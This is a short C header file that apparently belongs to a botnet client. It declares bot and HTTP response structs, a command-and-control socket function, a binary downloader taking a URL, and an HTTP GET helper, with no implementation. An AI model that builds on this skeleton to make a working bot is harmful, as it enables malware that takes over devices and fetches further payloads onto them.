#pragma once

typedef struct
{
    int Cpu;
    char *Arch;
    char *Vector;
} bot_info;

typedef struct
{
    struct sockaddr_in *Socket;
    bot_info Info;
    int Connected;
    int Sock;
} Bot;

typedef struct
{
    int StatusCode;
    char *Content;
} HttpResponse;

extern Bot *get_bot();
extern void cnc_socket();
extern int download_bin(char *filename, char *url);
extern HttpResponse *http_get(char *path, char *address, int port);
